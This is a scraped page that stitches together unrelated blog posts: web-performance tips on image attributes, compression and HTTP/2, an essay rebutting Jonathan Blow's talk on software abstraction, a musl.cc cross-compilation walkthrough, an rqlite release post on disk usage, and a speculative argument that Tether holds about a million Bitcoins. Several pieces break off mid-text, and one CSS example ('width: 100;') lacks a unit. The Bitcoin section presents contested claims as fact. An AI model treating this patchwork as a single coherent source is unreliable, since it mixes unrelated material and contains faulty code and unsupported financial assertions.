<a href="https://www.websitecarbon.com/" target="_blank" rel="noreferrer">The average page emits 1.76g of CO2</a> <a href="https://www.websitecarbon.com/" target="_blank" rel="noreferrer"><strong>per view</strong></a>. A site with 10,000 monthly page views spews 211Kg of CO2 per year.</p><p>There is a simple solution to web performance: <em>transmit less data and do less processing</em>. The practicalities are more challenging.
The following tips may be unconventional, controversial, counter-intuitive, or reverse previous advice. As always, the best result will depend on what you’re trying to achieve. Testing is imperative so tools such as <a href="https://developers.google.com/web/tools/lighthouse" target="_blank" rel="noreferrer">Lighthouse</a> and <a href="https://asayer.io/" target="_blank" rel="noreferrer">Asayer.io</a> can help evaluate the impact of your changes.</p><h2 id="1-set-image-width-and-height-attributes">1. Set image <code>width</code> and <code>height</code> attributes</h2><p>At the dawn of the web, developers added <code>width</code> and <code>height</code> attributes to every <code>&lt;img&gt;</code> element to reserve space on the page. The attributes became redundant when Responsive Web Design techniques arrived in 2010 since the values were overridden by CSS which sized an image to the width of its container:</p><div><pre><p><span>1</span><span>img {</span></p><p><span>2</span><span>  width: 100%;</span></p><p><span>3</span><span>  height: auto;</span></p><p><span>4</span><span>}</span></p></pre></div><p>or to no more than the physical pixel width:</p><div><pre><p><span>1</span><span>img {</span></p><p><span>2</span><span>  max-width: 100%;</span></p><p><span>3</span><span>  height: auto;</span></p><p><span>4</span><span>}</span></p></pre></div><p>Vertical space could only be allocated when an image started to download and its dimensions were determined. Page content would reflow and cause a content jump that was especially noticeable on smaller or slower devices:</p><p><img tabindex="0" src="https://asayer-content.s3.eu-central-1.amazonaws.com/dce419d6fa884b2ca130d4fc0a5cc7e2.gif" alt="Reflow example"></p><p>To solve this issue, the <code>width</code> and <code>height</code> attributes are back! Add them to your images and modern browsers will calculate the layout space according to the aspect ratio:</p><div><pre><p><span>1</span><span>&lt;!-- set a 400:300 (4:3) aspect ratio --&gt;</span></p><p><span>2</span><span>&lt;img src="image.webp" width="400" height="300" alt="an image" /&gt;</span></p></pre></div><p>The CSS <code>width</code> and <code>height: auto</code> properties are still required. If this image is placed into a 200px container, the browser reserves a area 200 x 150px and page reflows do not occur:</p><p><img tabindex="0" src="https://asayer-content.s3.eu-central-1.amazonaws.com/773285797b79428aa308cc88df9f6be5.gif" alt="Avoiding reflow example"></p><p>An alternative option is the new CSS <a href="https://developer.mozilla.org/docs/Web/CSS/aspect-ratio" target="_blank" rel="noreferrer">aspect-ratio</a> property but this has less browser support:</p><div><pre><p><span>1</span><span>img.ratio4-3 {</span></p><p><span>2</span><span>  width: 100;</span></p><p><span>3</span><span>  height: auto;</span></p><p><span>4</span><span>  aspect-ratio: 4 / 3;</span></p><p><span>5</span><span>}</span></p></pre></div><h2 id="2-compression-can-result-in-slower-responses">2. Compression can result in slower responses</h2><p>Algorithms such as gzip and Brotli are commonly used to reduce HTTP payloads by compressing data on the server before it is sent to the client. The process is efficient when the server compression, network delivery, and browser decompression time is less than sending an identical uncompressed asset.
Higher compression results in smaller files but requires more processing time. This rarely matters for static assets such as images which can be compressed once and delivered to everyone.
However, compression can be an issue for server-rendered content which changes according to the user request (social media messages, shopping baskets, etc). A faster, less effective algorithm — <em>or even no compression</em> — can result in a faster response.</p><h2 id="3-file-concatenation-can-make-a-site-slower">3. File concatenation can make a site slower</h2><p>Developers are advised to concatenate CSS and JavaScript into single files to reduce the number of HTTP requests. Image sprites containing multiple icons is a similar technique.
This was good advice for HTTP/1.1 connections but most hosts now offer HTTP/2 or above. HTTP/2 is multiplexed: <em>multiple request and response messages can occur on a single connection at the same time</em>. Making numerous requests is less expensive.
Consider a complex web application with 5,000Kb of JavaScript split over 50 files of 100Kb each. If they remain separate, changing a single <code>.js</code> file results in a 100Kb update for existing users. When the files are concatenated, the whole 5,000Kb payload must be invalidated and downloaded again.</p><h2 id="4-multiple-domains-may-not-improve-performance">4. Multiple domains may not improve performance</h2><p>Moving assets such as images, fonts, or scripts to a different domain — perhaps on a Content Delivery Network (CDN) — permits the browser to open additional connections. On HTTP/1.1, two domains doubles the number of concurrent requests.
As mentioned, HTTP/2 permits any number of requests on a single connection. Separate domains can have a detrimental effect on performance since each incurs an additional DNS look-up and TCP connection.</p><h2 id="5-use-font-repositories-effectively">5. Use font repositories effectively</h2><p>Font repositories such as <a href="https://fonts.google.com/" target="_blank" rel="noreferrer">Google Fonts</a> make management easy. However, self-hosting fonts on your own domain can give a performance boost:</p><ul><li>there is no additional DNS lookup</li><li>a smaller set of minified font files can be created</li><li>no additional CSS is appended to the payload</li></ul><p>If you continue to use a repository, always load the font using a HTML <code>&lt;link&gt;</code> element toward the top of the <code>&lt;head&gt;</code>, e.g.</p><div><pre><p><span>1</span><span>&lt;</span><span>link</span><span> </span><span>href</span><span>=</span><span>"</span><span>https://fonts.googleapis.com/css?family=Open+Sans</span><span>"</span><span> </span><span>rel</span><span>=</span><span>"</span><span>stylesheet</span><span>"</span><span> </span><span>/&gt;</span></p></pre></div><p>This downloads the font in parallel with other fonts and stylesheets.
A CSS <code>@import</code> rule seems cleaner but it blocks the download and parsing of its stylesheet until the font CSS has been processed.</p><h2 id="6-avoid-base64-encoding">6. Avoid base64 encoding</h2><p>Images, fonts, and other assets can be base64-encoded within HTML, CSS, and JavaScript files. It results in an indecipherable string of data but reduces the number of HTTP requests.</p><div><pre><p><span>1</span><span></span></p><p><span>2</span><span>    </span><span>.myimg</span><span> </span><span>{</span><span></span></p><p><span>3</span><span>      </span><span>background-image</span><span>:</span><span> </span><span>url('data:image/webp;base64,0123456789ABCDEF+etc+etc')</span><span>;</span><span></span></p><p><span>4</span><span>    </span><span>}</span></p></pre></div><p>This can have a negative effect on performance:</p><ol><li>Base64 encoding is typically 30% larger than a binary equivalent.</li><li>The browser takes longer to parse and process base64 strings.</li><li>The resulting file with encoded data is considerably larger.</li><li>Altering a small asset invalidates the whole of its (cached) container file.</li><li>Multiple requests are less expensive on HTTP/2 connections.</li></ol><p>Only consider base64 if an asset is unlikely to change and very small — perhaps no longer than its equivalent URL.</p><h2 id="7-load-es6-code-in-the-html-head">7. Load ES6 code in the HTML <code>&lt;head&gt;</code></h2><p>Modern frameworks often introduce build processes such as <a href="https://babeljs.io/" target="_blank" rel="noreferrer">Babel</a> to transpile ES6-level JavaScript to older ES5 scripts. The resulting code works in more browsers but:</p><ul><li>Modern browsers provide good ES6 support. The primary reason for serving ES5 is Internet Explorer: a decade-old application with a <a href="https://gs.statcounter.com/browser-market-share" target="_blank" rel="noreferrer">tiny market share</a>.</li><li>ES5 bundles can be considerably larger than ES6. <em>Why serve less efficient scripts to the majority of users?</em></li></ul><p>Consider one of these options if you must support IE:</p><ol><li>Use progressive enhancement techniques.</li><li>All browsers can load the site, but functionality is limited to whatever can be achieved in HTML and CSS alone.</li><li>Build both ES6 and ES5 scripts and serve to browsers according to support.</li><li>This has become easier because browsers which support ES6 modules have good ES6 support.</li></ol><p>Developers often place <code>&lt;script&gt;</code> tags just before the closing HTML <code>&lt;body&gt;</code> tag. This ensures the content can be viewed while a script loads even in very old browsers.
However, ES6 modules defer execution by default. Script files and inline code download in parallel and are executed in order <strong>after</strong> the HTML document has loaded. Similarly, ES5 <code>&lt;script&gt;</code> tags can use a <code>defer</code> attribute which is supported in IE10 and IE11.
It is more efficient to reference scripts toward the top of the HTML <code>&lt;head&gt;</code> so they download as soon as possible. The following code loads which ever script the browser supports and runs it once the page content is ready:</p><div><pre><p><span>1</span><span>&lt;</span><span>script</span><span> </span><span>type</span><span>=</span><span>"</span><span>module</span><span>"</span><span> </span><span>src</span><span>=</span><span>"</span><span>es6-script.js</span><span>"</span><span>&gt;</span><span></span><span>&lt;/</span><span>script</span><span>&gt;</span><span></span></p><p><span>2</span><span>    </span><span>&lt;</span><span>script</span><span> </span><span>nomodule</span><span> </span><span>defer</span><span> </span><span>src</span><span>=</span><span>"</span><span>es5-script.js</span><span>"</span><span>&gt;</span><span></span><span>&lt;/</span><span>script</span><span>&gt;</span></p></pre></div><h2 id="8-check-the-efficiency-of-es5-transpilation">8. Check the efficiency of ES5 transpilation</h2><p>If you’re not willing to jump to an ES6-only world just yet, always check the efficiency of your transpiled scripts.

<h2>Is Software Abstraction Killing Civilization?</h2>

<p><b>Or: Jonathan Blow is wrong but also right and we still
need to prevent the collapse of civilization</b></p>

<p><i>Early 2021</i></p>

<p>
I recently stumbled upon
<a href="https://www.youtube.com/watch?v=ZSRHeXYDLko">a talk by game
development guru Jonathan Blow</a>, about how software 
abstraction will lead to the end of civilization. Quick summary:
</p>
<ul>
  <li>Information passed on between generations is diluted.
    Practise is better than theory for keeping skills alive.</li>
  <li>Software runs the world.</li>
  <li>Abstraction fosters ignorance about low level programming.</li>
  <li>If we forget low level stuff, civilization will fall apart
    since we won't be able to keep vital software running.</li>
</ul>
<p>
It was one of those 
talks that might at a first glance seem perfectly reasonable, not least 
because similar ideas are regularly discussed in programmer circles by a
great number of 
people. Then you start thinking about what's said, and all the errors and 
misconceptions presented makes you feel troubled, because it's both 
tempting and easy to perpetuate the punchlines without
considering their implications. <b>I agree with Blow that it's
important to pass knowledge between generations. Therefore, the veracity
of that information is extremely important.</b> I propose that
the information given in the very talk about the importance of
such information, is in fact wrong on many counts.
</p>

<p>
That's why I, in this rather long text, have tried to examine Blow's
claims in detail. (TL;DR: Someone is wrong on the Internet - man with
ample spare time on his hands to the rescue!)
</p>

<h3>Some examples of collapsed civilizations and artefacts lost in time</h3>

<p>
I'm not a historian and will not comment on this first part of the talk. It doesn't matter much, though; my gripe is mainly with the second part.
</p>

<h3>Five nines</h3>

<p>
Blow says we used to use the "five nines" (99.999% uptime) metric when selling computer systems. Since his laptop has the habit of rebooting when in sleep mode, it can never be a candidate for 99.999% uptime. This part is true: five nines means a total yearly downtime of just above five minutes. This is presented as proof that we have lost a rhetoric of quality. This part is false.
</p>

<p>
In reality, five nines usually applies to things like emergency response switchboards (911), hospital systems, financial transaction processing, etc. It's also a metric usually accompanied by long contracts detailing various downtime scenarios that couldn't possibly count as downtime. It has never, ever been used to sell consumer laptops or the word processors we run on them.
</p>

<p>
It's also incorrect that five nines isn't used anymore: several companies, such as IBM and Amazon, sell such systems and services. Incidentally, IBM actually goes further and claims their Power9 platform can provide even higher availability. Provided, I'm sure, the network used to reach it is functioning and the client computers are working and, and, and... you get the point.
</p>

<p>
So, no, we haven't lost this rhetoric of quality. We've simply never used it the way Blow claims.
</p>

<p>
Oh, and in case anyone's wondering, my laptops never reboot unless I tell them to and one of them currently has an uptime of 55 days.
</p>

<h3>"The industry hasn't produced robust software for decades"</h3>

<p>

What is robust? Is it my iPhone, going for weeks and months without a 
reboot? Is it
<a href="https://arstechnica.com/information-technology/2013/03/epic-uptime-achievement-can-you-beat-16-years/">the famous uptime of Novell's file and printer servers</a>, 
with documented instances running for 16 years? Is it the multi-year 
uptimes of a plethora of Unix, Windows and VMS machines? Is it the 365+ 
days (and counting) uptime of some random Linux web server I've got 
access to? Is it turnkey systems like IBM i, offering continuous 
availability?

</p>

<p>
Apparently none of the above, according to Blow.
</p>

<h3>"Tech companies are no longer about pushing tech forward"</h3>

<p>
Well, yes and no. I agree that the lifestyle app startups of Silicon Valley (and elsewhere) are hardly about pushing tech forward - but people more interested in making money rather than amazing technology has always been around. Was Infocom's umpteenth text adventure about pushing tech forward? Was any of the ten bazillion (a rough estimate) jumpy-shooty platform games produced? Was MS-DOS, single-tasking its way through 15 years of building Microsoft's empire right up until its last breath in version 6.22?
</p>

<p>
There's a lot of exciting stuff happening on the "hard tech" front. Blow does mention machine learning earlier in his talk, but "boring" things like file systems, web servers, databases and programming languages are also continually developed and improved upon. A lot of effort is also going into improving the various layers of abstraction, virtualization and containerization Blow is so adverse to - but him disliking them doesn't mean they're not about pushing tech forward.
</p>

<h3>"Abstraction leads to loss of capability."</h3>

<p>
Blow lists a number of programming languages, some of which have fallen out of fashion because of abstraction. His take basically boils down to learning assembly coding, memory management and pointers.
</p>

<p>
I agree that a large number of programmers today (myself included) are very happy with not having to deal with things like memory allocation and pointers. And yes, there are certainly horrifying examples of when abstraction gets the better of us. Plenty of web sites use a lot of completely unnecessary JavaScript framework voodoo to render a simple blog and plenty of supposed "desktop apps" are really running (very slowly) inside a bundled browser.
</p>

<p>
Despite that, I'm willing to bet a few bucks there are more people 
around today (including youngsters) who can program in C than ever 
before, and that more C and assembly code is being written than ever 
before. Linux and NetBSD, for example, are continuously being ported to 
pretty much everything that even vaguely resembles a CPU. Rust, a new 
language with a heavy focus on robustness, <b>does</b> feature pointers and 
lets the programmer manage memory. Harvard's introduction to Computer 
Science, CS50, is publicly available on Youtube and each year it 
features <a href="https://www.youtube.com/watch?v=cF6YkH-8vFk">a two hour
lecture on stuff like memory layout, pointers,
malloc() and free()</a>.
</p>

<p>
I agree that the things mentioned here are good to know about and I think anyone seriously into programming should at least try them out some time, if for no other reason than to understand why a lot of us prefer to avoid them if given the option to do so.
</p>

<p>
Oh, and garbage collection and functional programming aren't new 
abstractions. Lisp did both in the late 1950s and it's been used in a 
lot of "hardcore" settings, including
<a href="http://flownet.com/gat/jpl-lisp.html">NASA's Jet Propulsion Lab</a>.
And, unsurprisingly, a Lisp programmer will of course claim that Lisp
makes you much more productive than something with malloc() ever will.
</p>

<h3>"The productivity of Facebook employees is approaching zero"</h3>

<p>
Here we're shown some graphs of the rising number of Facebook and Twitter employees and Blow states that since Facebook doesn't really get that many new features each year, all those programmers mostly sit around and do nothing.
</p>

<p>
First of all, I'm pretty sure Facebook employs a wide range of staff who are not feature developers: lawyers, accountants, graphical 
designers, sysadmins, researchers, HR, middle management, etc. When not working on Facebook the site, employees of Facebook the company 
are also working on Instagram, WhatsApp and Oculus VR to name some of their other pursuits. I'd also argue that (measurable) individual 
output in general drops as a result of a company growing. You need to reach a certain critical mass to have a whole team working hard on 
a feature only to, by some managerial decision, drop it right before it's finished. Things like that happen all the time in large 
software companies and won't show up in Blow's rather flimsy metric.
</p>

<p>
More importantly, Blow constructs this argument around the assumption that Facebook's product is Facebook, in the sense of the social platform. This is of course wrong. Facebook doesn't have to add or change very many features on their social platform every year, they just have to keep things smooth enough for those who actually use those functions to stay content.
</p>

<p>
This is because Facebook's real product is an ad delivery platform.
</p>

<p>
As such, it collects massive amounts of personal and private data and churns it into targeted ads, all the while sucking people in with cleverly designed attention-grabbing dark patterns. I'm sure plenty of work is done on this by a whole lot of programmers, but it'll never appear as "features" to the user, only as corporate revenue. In that respect, Facebook programmers seem to be highly productive.
</p>

<h3>Ken Thompson's "Three Week Unix"</h3>

<p>
First off, I'm not out to belittle Ken Thompson's efforts here. Writing an assembler, editor and basic kernel in three weeks is highly respectable work by any standard. It's also a great piece of computer lore and fits Blow's narrative perfectly - especially with Kernighan's little quip about productivity in the end. Of course, we don't know how "robust" Thompson's software was at this stage, or how user friendly, or what kind of features it had. I'm going to boldly claim it would've been a hard sell today, even if it did run on modern hardware.
</p>

<p>
I'm also pretty sure Thompson dealt with little or nothing of the following during those three weeks: documentation, code reviews, daily standups, backlog grooming, user stories, unit tests, customer demands, A/B testing, writing commit messages and adhering to a corporate code formatting standard. We are after all talking about a guy who, when he could pick any names he wanted, opted for "creat", "mv" and "cp".
</p>

<p>
I'm also certain Thompson could work alone in a private office, rather than share an open floor plan with fifty colleagues incessantly shouting into cellphones, shuffling furniture around or having animated discussions about football two feet from his desk.
</p>

<p>
It's important to remember that apart from hardware and software, the working conditions for most developers are vastly different …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
<p>When working on command-line utilities which can be useful for various platforms, from Windows on x86 to Linux on MIPS, the existence of a cross-compilation is highly attractive. A number of different binaries can be constructed conveniently from a single, typically powerful host system.</p>

<p><a href="https://alpinelinux.org/">Alpine Linux</a> popularizes the use of <a href="https://musl.libc.org/">musl</a> a no-frills C standard library for Linux. According to its website:</p>

<blockquote>
<p>musl is lightweight, fast, simple, free, and strives to be correct in the sense of standards-conformance and safety.</p>
</blockquote>

<p>In addition, thanks to <a href="https://zv.io/">Zach van Rijn</a>, we have a collection of static toolchains based on musl at <a href="https://musl.cc/">musl.cc</a> at our disposal. The number of supported systems is rather mind blowing, you got everything from the usual i686 to MIPS to Microblaze and many others.
<a href="https://github.com/ariya/fastlz/actions">https://github.com/ariya/fastlz/actions</a></p>

<p>As I search for a viable alternative to the cross-compilation method based on Dockcross (see my previous blog post: <a href="https://ariya.io/2019/06/cross-compiling-with-docker-on-wsl-2/">Cross Compiling with Docker on WSL 2</a>), musl.cc fits the requirements nicely. I am in the process of migrating the <a href="https://github.com/ariya/fastlz/actions">continuous integration</a> of FastLZ, my implementation of byte-aligned LZ77 compression algorithm, to be completely based on musl.cc.</p>

<p>Here is a quick walkthrough. As long as you are on Linux x86-64, you can follow along easily (and yes, this also works great on <a href="https://docs.microsoft.com/en-us/windows/wsl">WSL</a>, Windows Subsystems for Linux). As a reference, we will use the simplest ANSI C/C90 program available at <a href="https://github.com/ariya/hello-c90">github.com/ariya/hello-c90</a>.</p>

<p><img src="https://ariya.io/images/2020/06/crosscompiler.png" width="584" height="357" alt="Cross compilation with musl Toolchains"></p>

<p>First and foremost, we need <a href="https://qemu.org/">QEMU</a> so we can test our binaries not native to x86-64. For convenience, GNU Make is also necessary.</p>

<pre><code>$ sudo apt install -y qemu-users make
</code></pre>

<p>After that, let us grab the Hello C90 program:</p>

<pre><code>$ git clone https://github.com/ariya/hello-c90.git
$ cd hello-c90
</code></pre>

<p>For a start, let us try to produce MIPS64 binary of our little Hello C90 program. Thus, we ought to grab the toolchains first, weighing at about 90 MB.</p>

<pre><code>$ curl -O https://musl.cc/mips64-linux-musl-cross.tgz
$ tar xzf mips64-linux-musl-cross.tgz
</code></pre>

<p>To ensure that this fresh cross-compiler works, do a quick sanity check:</p>

<pre><code>$ ./mips64-linux-musl-cross/bin/mips64-linux-musl-gcc --version
mips64-linux-musl-gcc (GCC) 9.3.0
Copyright (C) 2019 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</code></pre>

<p>This looks good! Now we can compile our Hello C90 program statically:</p>

<pre><code>$ make CC=./mips64-linux-musl-cross/bin/mips64-linux-musl-gcc LDFLAGS=-static
./mips64-linux-musl-cross/bin/mips64-linux-musl-gcc -O -Wall -std=c90 -c hello.c
./mips64-linux-musl-cross/bin/mips64-linux-musl-gcc -static -o hello hello.o
</code></pre>

<p>Checking the resulting binary should give the following:</p>

<pre><code>$ file ./hello
./hello: ELF 64-bit MSB executable, MIPS, MIPS-III version 1 (SYSV), statically linked, not stripped
</code></pre>

<p>It is exactly what we want! To run the executable:</p>

<pre><code>$ qemu-mips64 ./hello
Hello, world! From C90 with love...
</code></pre>

<p>Now, if you are doing this on WSL, or generally have a Windows machine available elsewhere, there is this fun activity of cross-compiling the above app for Windows, without the need for any Windows compiler and SDK. Same steps as before:</p>

<pre><code>$ curl -O https://musl.cc/x86_64-w64-mingw32-cross.tgz
$ tar xzf x86_64-w64-mingw32-cross.tgz
$ make CC=./x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc LDFLAGS=-static
$ file ./hello.exe
./hello.exe: PE32+ executable (console) x86-64, for MS Windows
</code></pre>

<p>To really test it, just bring <code>hello.exe</code> to Windows and it is going to run as expected.</p>

<p>For more details and elaborated examples, check the collection of <a href="https://github.com/ariya/hello-c90/tree/master/.github/workflows">workflows YAML files</a> of this Hello C program.</p>

<p>Combined with the continuous integration system of your choice, whether it is DIY via Jenkins or using one of the many services out there (GitHub Actions, Azure Pipelines, Travis CI), creating binaries for various operating systems becomes easier than ever!</p>

<p>Since the release of<a href="https://github.com/rqlite/rqlite/releases/tag/v5.6.0" target="_blank" rel="noopener noreferrer"> 5.6.0</a> there are have been a number of distinct improvements, all aimed at reducing the amount of data written to disk. Why focus on disk usage? First because it’s long been obvious that disk IO is the performance bottleneck for rqlite, due to <a href="https://linux.die.net/man/2/fsync" target="_blank" rel="noopener noreferrer">fsync’ing</a> to the <a href="https://raft.github.io/" target="_blank" rel="noopener noreferrer">Raft log</a>. Secondly, rqlite aims to be a <em>lightweight</em> database, so keeping its disk footprint low is desirable. 5.10.0 now contains the following changes:</p>
<ul>
<li><a href="https://developers.google.com/protocol-buffers/docs/gotutorial" target="_blank" rel="noopener noreferrer">Protocol Buffer (Protobuf)</a> encoding of the SQL commands before they are written to the Raft log. Generally speaking protofbuf encoding is more space-efficient than JSON, which is what used in 5.6.0.</li>
<li>Compression of SQL queries (and batches of SQL queries) above a <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/command/marshal.go#L14" target="_blank" rel="noopener noreferrer">certain threshold</a>, which happens before the Protobuf-encoding, and before the commands are written to the Raft log. The savings from compression are greater the larger the SQL queries sent to rqlite. This also has the nice affect of reducing network traffic from the leader node to other nodes in the cluster.</li>
<li>Compressing the copy of the SQLite database that becomes part of the <em>Raft snapshot</em>. Snapshotting is a critical step in <em>truncating</em> the Raft log, a process that ensures that the log doesn’t grow without limit. This snapshot is written to disk, for restart and recovery purposes.</li>
<li>No more use of disk for <a href="https://en.wikipedia.org/wiki/Scratch_space" target="_blank" rel="noopener noreferrer">scratch space</a>, during creation of the snapshot. Snapshot-creation now takes place entirely in memory.</li>
<li>During normal operation rqlite can use either an <a href="https://github.com/rqlite/rqlite/blob/v5.10.0/README.md#in-memory-databases" target="_blank" rel="noopener noreferrer">in-memory (the default)</a> or on-disk SQLite database. However restarting an on-disk node could previously take a long time, because applying changes from the Raft log to an on-disk database is significantly slower than writing to an in-memory database. Now 5.10.0, when running in on-disk mode, first rebuilds the SQLite in memory and only when that is complete does it move the database to disk. This means disk-based restarts are basically as fast as memory-based restarts.</li>
</ul>
<h2>Measuring the impact</h2>
<p>While it’s fairly easy to predict the impact the changes above will have, it’s always important <a href="https://www.philipotoole.com/a-prayer-for-distributed-systems-developers/">to confirm the results</a>. So I ran a simple, 6-hour load test against a single rqlite node, which used an in-memory SQLite database. The load test involved inserting a simple record into a table, over and over again. I used <a href="https://github.com/rqlite/rqlite/tree/v5.10.0/cmd/rqbench" target="_blank" rel="noopener noreferrer">rqbench</a> to perform the writes:</p>
<pre>rqbench -o 'CREATE TABLE foo (id INTEGER NOT NULL PRIMARY KEY, name TEXT)' -m 100 -n 1500000 'INSERT INTO foo(name) VALUES("fiona")'</pre>
<p>I used <a href="https://github.com/influxdata/influxdb" target="_blank" rel="noopener noreferrer">InfluxDB</a>, <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>, and <a href="https://github.com/influxdata/telegraf" target="_blank" rel="noopener noreferrer">Telegraf</a> (specifically the <a href="https://github.com/influxdata/telegraf/tree/master/plugins/inputs/http" target="_blank" rel="noopener noreferrer">http</a> plugin) to collect (via the rqlite <a href="https://github.com/rqlite/rqlite/blob/master/DOC/DIAGNOSTICS.md" target="_blank" rel="noopener noreferrer">diagnostics endpoint</a>) and display the results.</p>
<p>Let’s take a look at 5.6.0 performance first (technically <a href="https://github.com/rqlite/rqlite/tree/v5.6.1" target="_blank" rel="noopener noreferrer">a patched version of 5.6.0</a> so the required metrics were collected).</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.6.1-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>Nothing too out of the ordinary. The CPU is never that busy and mostly waiting for IO. The amount of data being written to disk — and rate it is being written — steadily increases however, as the SQLite snapshots grow in size. The Raft subsystem operated normally — committing log entries, and performing a snapshot every couple of minutes or so.</p>
<p>Compare the results of the same test, this time for 5.10.0.</p>
<p><a href="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png"><img src="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png" alt="" width="474" height="251" srcset="https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1024x543.png 1024w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-300x159.png 300w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-768x407.png 768w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated-1536x814.png 1536w, https://www.philipotoole.com/wp-content/uploads/2021/02/5.10.0-annotated.png 1872w" sizes="(max-width: 474px) 100vw, 474px"></a></p>
<p>This time disk activity is significantly down, but the trade-off is more CPU activity during the snapshot-compression cycles. This is exactly the trade-off I wanted to make, but it’s good to see that it is actually happening. Note that the disk footprint is much smaller too — it’s only 30% as large for (roughly) the same amount of SQL insertions.</p>
<h2>What didn’t change?</h2>
<p>The write-performance of rqlite generally hasn’t changed that much between versions, not with these relatively small SQL statements. Mildly disappointing perhaps. However snapshotting should put much less burden on the system, meaning much less disruption to the write-performance during that periodic process. And larger SQL statements should see a much bigger write-performance improvement relative to 5.6.0, as the compression wins should also be bigger.</p>
<p>It’s also good to see that write performance remained steady throughout each test. This wasn’t something I had explicitly tested before, and didn’t receive reports of any issues, but again, it’s good to see.</p>
<p>5.10.0 adds some other small features, as well as some more diagnostics. I also expanded the test suite, as code quality is very important to me. So <a href="https://github.com/rqlite/rqlite/releases" target="_blank" rel="noopener noreferrer">download</a> it and check it out.</p>

<p>In March 2020, unregulated crypto exchanges, led by Binance, switched to USDT as collateral for margin trading. This has led to a progressive release of around 1 million Bitcoins previously locked as collateral. The fact these newly available Bitcoins didn’t crash the price only makes sense if Tether scooped them up and is now holding them as reserves.</p>



<p>The price of Bitcoin is determined, same as for all assets, at the margin. The price is a market equilibrium between how many Bitcoins are available for trading, and how many Bitcoins are needed for daily flows:</p>



<p><strong>$BTC = Turnover / Supply</strong></p>



<p>This formula is quite straightforward: the price of Bitcoin rises with increasing use cases, and decreases with the amount of Bitcoins competing for these use cases. Note that Supply only means “Bitcoins available for trading” – all the Bitcoins sitting in HODL wallets don’t take part in the price discovery process.</p>



<h3>Bitcoin price and turnover</h3>



<p>There are three types of Bitcoin turnover:</p>



<ul><li>short term (a few days), for transfers (capital flight from China, unregulated exchange account funding, remittances)</li><li>medium term (a few months), for collateral and arbitrage (margin trading, Grayscale premium arbitrage)</li><li>long term (a few years), for HODLing</li><li></li></ul>



<p>There are also two types of one-way flows, impacting the amount of Bitcoins available:</p>



<ul><li>lost coins (reducing the Supply, positive for price)</li><li>mining rewards (increasing the Supply, negative for price)</li></ul>



<p>The first three flows compete for the Bitcoins that are available for trading at that time (“S” for Supply). For instance, if Bitcoins were only used for transfers, and people were using Bitcoin to transfer $10 billion per day, assuming an average transaction length of 1 day, the price of Bitcoin would be:</p>



<p><strong>$BTC = $10B / S</strong></p>



<p>If the Supply is 1 million Bitcoins, that would give you a $BTC market equilibrium price of $10,000. The idea is that people who use Bitcoin for real world use cases don’t care about its price, and will simply buy an amount in fiat that they need for their purpose, while the Bitcoins available for trading will compete for that fiat.</p>



<p>All things remaining equal, you have two rules:</p>



<ol><li>The lower the Supply, the higher Bitcoin’s price, and vice versa</li><li>The higher the flows, the higher Bitcoin’s price, and vice versa</li></ol>



<h3>The impact of USDT replacing Bitcoin</h3>



<p>Ever since exchanges started replacing Bitcoin by USDT for margin trading collateral, the amount of Bitcoins at exchange-controlled wallets has steadily decreased:</p>



<figure><img src="https://pbs.twimg.com/media/Ep6Hw6cXcAUYSYJ?format=jpg&amp;name=4096x4096" alt="Image"></figure>



<p>This trend has, of course, been compensated by a relentlessly increasing amount of USDT in circulation, to the tune of Bitcoin outflows multiplied by their price:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02.png 772w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-300x138.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.00.02-768x354.png 768w" sizes="(max-width: 772px) 100vw, 772px"></figure>



<p>Unsurprisingly, most of these new USDTs sit on exchanges, Binance being on the top of the list, as they’re being used as collateral:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png 1024w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-300x111.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-768x285.png 768w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37.png 1136w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This move has greatly increased the Bitcoin supply, to the tune of 1 million Bitcoins. These are Bitcoins that have been gradually released from being frozen as collateral, and are now available for other types of use.</p>



<p>The increased acceptance of USDT are also replacing Bitcoin for the transfer use case, as they aren’t volatile, and can be sent almost instantly. This has reduced Bitcoin turnover.</p>



<h3>Bitcoin to the moon… HOW?</h3>



